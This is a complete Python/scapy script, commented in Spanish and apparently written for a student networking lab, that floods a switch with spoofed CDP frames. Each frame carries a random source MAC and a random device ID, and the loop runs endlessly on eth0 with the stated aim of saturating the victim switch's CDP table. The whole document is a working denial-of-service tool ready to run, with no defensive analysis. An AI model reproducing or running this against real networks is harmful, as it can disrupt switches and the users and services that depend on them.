from scapy.all import *
import random
import string

def jonath_cdp_flood(interfaz):
    """
    Función principal del ataque CDP DoS.
    Genera paquetes CDP malformados con MACs aleatorias
    para saturar la tabla CDP del switch víctima.
    """
    print("=" * 50)
    print("  CDP DoS Attack - Jonathan Sención 20250851")
    print("=" * 50)
    print(f"[*] Interfaz objetivo: {interfaz}")
    print("[*] Iniciando flood de paquetes CDP...")
    print("[*] Presiona Ctrl+C para detener\n")
    
    contador = 0
    while True:
        # Generamos un Device ID aleatorio para cada paquete
        device_id = ''.join(random.choices(string.ascii_letters, k=10))
        
        # Construimos el frame Ethernet con destino multicast CDP
        paquete_cdp = (Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC()) /
                       LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) /
                       SNAP(OUI=0x00000c, code=0x2000) /
                       Raw(load=b'\x02\x00' + len(device_id).to_bytes(1,'big') + device_id.encode()))
        
        # Enviamos el paquete por la interfaz especificada
        sendp(paquete_cdp, iface=interfaz, verbose=False)
        contador += 1
        print(f"[*] Paquetes CDP enviados: {contador}", end="\r")

# Punto de entrada del script
jonath_cdp_flood("eth0")
